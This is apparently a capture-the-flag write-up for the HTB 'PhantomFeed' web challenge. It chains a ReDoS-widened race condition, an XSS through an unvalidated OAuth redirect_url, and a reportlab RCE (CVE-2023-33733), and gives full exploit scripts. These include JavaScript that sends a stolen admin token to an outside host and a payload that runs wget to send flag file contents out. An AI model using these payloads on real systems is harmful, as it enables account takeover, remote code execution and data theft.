---
layout: writeup
parent: HTB UNI Brains & Bytes
grand_parent: 2023
author: tomvg
category: web
tags: 
title: "PhantomFeed"
subtitle: ""
write_date: 2023-12-10
last_edit_date:
# layout: mathjax # Uncomment this line to enable MathJax
---

*Note: Backup of challenge source code available at [web_phantomfeed.zip](/assets/challenge-sources/2023/htb-uni-brains-bytes/web_phantomfeed.zip).*

The PhantomFeed challenge consists of three different components: the marketplace frontend (served at localhost:5000), the marketplace backend (localhost:4000) and a feed of messages (localhost:3000). All of these services are also served by a reverse nginx proxy (localhost:1337) made available on different paths (`/`, `/backend` and `/phantomfeed` respectively).

Similarly, the challenge also consists of three main parts, although we only know that with the power of hindsight.

## Registering a user

At `/phantomfeed/register` we can find the form that is used for registration, which will create a user account that still needs to be verified.

```python
db_session = Database()
user_valid, user_id = db_session.create_user(username, password, email)

if not user_valid:
  return render_template("error.html", title="error", error="user exists"), 401

email_client = EmailClient(email)
verification_code = db_session.add_verification(user_id)
email_client.send_email(f"http://phantomfeed.htb/phantomfeed/confirm?verification_code={verification_code}")
```

However, when we look into the email client, we can see that the code for sending the verification code is actually commented out, so currently not working.

```python
def send_email(self, message):
    pass
    # try:
    #     self.server = smtplib.SMTP(self.smtp_server, self.smtp_port)
    #     self.server.starttls()  # Use TLS for security
    #     self.server.login(self.username, self.password)
```

Circling back a bit, we can see that when a new user is created, it is actually verified as the default value of the `verified` column of users is set to `True`:

```python
class Users(Base):
  __tablename__ = "users"
  id = Column(Integer, primary_key=True)
  verification_code = Column(String)
  verified = Column(Boolean, default=True)
  username = Column(String)
  password = Column(String)
  email = Column(String)
```

So this means that between the `create_user` call and the `add_verification` call, we have created a user who is actually verified. This means that we have a race condition that would eventually allow us to register and login. However, this interval is unfortunately too small to reliably and practically exploit. Hence, we should try to make the window of opportunity larger. When looking at the implementation of EmailClient, this allows us to do exactly that.

```python
class EmailClient:
  def __init__(self, to_email):
    email_verified = self.parse_email(to_email)

...

  def parse_email(self, email):
    pattern = r"^([0-9a-zA-Z]([-.\w]*[0-9a-zA-Z])*@(([0-9a-zA-Z])+([-\w]*[0-9a-zA-Z])*\.)+[a-zA-Z]{2,9})$"
    try:
      match = re.match(pattern, email)

...
```

When [checking](https://devina.io/redos-checker) whether that regular expression is vulnerable to ReDoS, we can see that it is. This allows us to arbitrarily increase the time that the created user is verified. All we have to do is enter an email that takes a long time to parse. Something like `'A@0' + ('AA.0' * n) + 'AA'` does the job well (the higher `n`, the longer the regex takes to match).

Exploiting the ReDoS and race condition looks as follows:

```python
import random
import string
import time
import asyncio
import aiohttp

def random_user():
  return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(16))

BASE_URL = 'http://127.0.0.1:1337'  # change with remote IP
BASE_FEED_URL = BASE_URL + '/phantomfeed'

user = random_user()
email = 'A@0' + ('AA.0' * 10) + 'AA'
start = time.time()

async def register(user, email):
  async with aiohttp.ClientSession() as session, session.post(BASE_FEED_URL + '/register', data={"username": user, "password": "yyy", "email": email}) as response:
    await response.text()
    return

async def login(user):
  async with aiohttp.ClientSession() as session, session.post(BASE_FEED_URL + '/login', data={"username": user, "password": "yyy"}, allow_redirects=False) as response:
    text = await response.text()
    if 'Set-Cookie' in response.headers:
      print(response.headers.get('Set-Cookie'))
    return text

async def main():
  t = []
  t.append(asyncio.create_task(register(user, email)))
  for x in range(100):
    t.append(asyncio.create_task(login(user)))
  await asyncio.gather(*t)

asyncio.run(main())
```

If successful (in my experience, most of the times) it will spit out the cookies for a registered user.

## Stealing administrator token

Once we are able to login, we can access quite some more functionality. One example is adding new messages to the feed, that are then visited by the administrator account (Selenium webdriver, with token of administrator set as the `token` cookie).

After a lot of searching, and trying different ways to make use of the cookie, I found that the goal might be to steal the token. We can easily do that if we have an XSS (as the `HttpOnly` attribute is not set on the cookie). So... let's look for an XSS!

Trying all different endpoints, I noticed that the JSON response in `/phantomfeed/oauth2/token` was served with `text/html` as content type. And... this contained the `redirect_url`, which we can fully control, and wasn't validated.

So to exploit this we can do the following steps:

1. Create an OAuth authorization code for our user (by calling `/phantomfeed/oauth2/code`), and set the `redirect_url` to `<script src=//example.com/exploit.js></script>`.
2. Use that code in the URL for `/phantomfeed/oauth2/token` endpoint
3. Send that URL to the administrator bot
4. In `exploit.js` get the token from the administrator, using another call to `/phantomfeed/oauth2/token` (for which we need another valid token)
5. Leak the admin token to ourselves, and PROFIT

The complete exploit for this second phase looks as follows:

{% raw %}
```python
import requests
from base64 import b64encode

HOST = "127.0.0.1:1337"  # replace with remote host
BASE_URL = 'http://' + HOST
BASE_FEED_URL = BASE_URL + '/phantomfeed'

s = requests.session()
redirect_url = '<script/src=//foo.drud.us/htb-exploit.js></script>'
token_cookie = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwaGFudG9tZmVlZC1hdXRoLXNlcnZlciIsImV4cCI6MTcwMjIyMDA2MiwidXNlcl9pZCI6MjcsInVzZXJuYW1lIjoiaUxKSkxaaGxSMlQwaVVpcCIsInVzZXJfdHlwZSI6InVzZXIifQ.vEvOFjMgvr6atU6IhT1AWjSjrBgxqPj3l2S0oTWyx1ZqlvUejG6Li7FFKtAtF5pvv5jf4TVN25KCE2gZWoJRvE702Ci2Ov0v6RYrwGOYQcUpNEzQZ5l7ueYEVRT8bWUuC3n0h_LNUmmiQHR53N-3IUE9xLKcqSCYw4nDJb-y24gU6P2Vwp4o0W4VbSnDNsBgTalSPbGIEcoo2DO5aupnVtQGCsIBaJ0fqRvDhwhY9zd_VL-mZ3PbVODdyi8efMEVsW6MR_gEPatWIciVfaN92xcty59sOneVGzyYsr6dvVuuiHrAch4VfqizuvO0_OZxrKTh5-vIbSPR1MRr8lTlng"  # replace with token obtained in first step
r = s.get(BASE_FEED_URL + "/oauth2/code?client_id=phantom-market&redirect_url=" + redirect_url, allow_redirects=False, cookies={"token": token_cookie})
code = r.headers.get('Location').replace(redirect_url + '?authorization_code=', '')
r = s.get(BASE_FEED_URL + "/oauth2/code?client_id=phantom-market&redirect_url=" + redirect_url, allow_redirects=False, cookies={"token": token_cookie})
code2 = r.headers.get('Location').replace(redirect_url + '?authorization_code=', '')


js = f'''
(async () => {{
  let resp = await fetch(`http://127.0.0.1:1337/phantomfeed/oauth2/token?client_id=phantom-market&redirect_url=${{atob('{b64encode(redirect_url.encode()).decode('utf-8')}')}}&authorization_code={code2}`);
  let json = await resp.json();
  await fetch(`http://muf9e4po.requestrepo.com/leak?${{json["access_token"]}}`);
}})();
'''

print('link to post to feed: ', "@127.0.0.1:1337/phantomfeed/oauth2/token?client_id=phantom-market&redirect_url=" + redirect_url + "&authorization_code=" + code)
print('JS to host in exploit.js\n=============================================')
print(js)
```
{% endraw %}

## RCE to get the flag

One functionality that only administrators can do, is generate PDFs of the orders. The PDF is generated based on an HTML, for which the `color` parameter can be controlled, and is used in the template as follows:

{% raw %}
```html
<font color="{{ color }}">
  Orders:
</font>
```
{% endraw %}

Looking for known exploits for the HTML2PDF library that was used, we quickly find CVE-2023-33733, that is an exploit for when the `color` attribute of a `font` is abused (surprise, surprise). Simply copy-pasting and adjusting the executed code of [the PoC for the CVE](https://github.com/c53elyas/CVE-2023-33733) did the trick.

The final exploit looks as follows:

```python
import requests

HOST = "127.0.0.1:1337"  # replace with remost host
BASE_URL = 'http://' + HOST
BASE_BACKEND_URL = BASE_URL + '/backend'

admin_token = "eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJwaGFudG9tZmVlZC1hdXRoLXNlcnZlciIsImV4cCI6MTcwMjIyMDQxNCwidXNlcl9pZCI6MSwidXNlcm5hbWUiOiJhZG1pbmlzdHJhdG9yIiwidXNlcl90eXBlIjoiYWRtaW5pc3RyYXRvciJ9.nbn6qxsdKQBFtx9m-XQVy8wQlXZq-eSixcoi9PX7EZzRRecHDd2jKq2gElrCBWsmlAy9lZUNbV5BkiKlnfOMylvizqF3D_XbpFP-ExCDnnKcwnJbWA9DslhdsFLVFDuItEosHnQOE37lzs9Q5s1SakD3-PXU1S3vsI8A7kPn5jqxs6TGx0QwOfFJoL7cA8hVR71ZjDWrBtini2bBmOeTyVdEzk7nnrRbWTfO-Hvdp9gW11saDrktLCVuOyDPmWFLP6H9D5LfXuEfzcemd1xtCRc-2x5HwV-W7CmiZ6n5cUgfek7AenUoSC88xkVaicAzbQTShZ6eIT1UbqD2p1IxIQ"  # replace with token obtained in second phase
r = requests.post(BASE_BACKEND_URL + '/orders/html',
                  data={"color": "[[[getattr(pow, Word('__globals__'))['os'].system('wget http://muf9e4po.requestrepo.com/$(cat /flag*)') for Word in [ orgTypeFun( 'Word', (str,), { 'mutated': 1, 'startswith': lambda self, x: 1 == 0, '__eq__': lambda self, x: self.mutate() and self.mutated < 0 and str(self) == x, 'mutate': lambda self: { setattr(self, 'mutated', self.mutated - 1) }, '__hash__': lambda self: hash(str(self)), }, ) ] ] for orgTypeFun in [type(type(1))] for none in [[].append(1)]]] and 'red'"},
                  headers={"Authorization": f"Bearer {admin_token}"})
```

While listening for requests, we soon see the flag appearing; `HTB{r4c3_2_rc3_04uth2_j4ck3d!}`. Yay!

All in all, great challenge - nice that it was built in different phases!
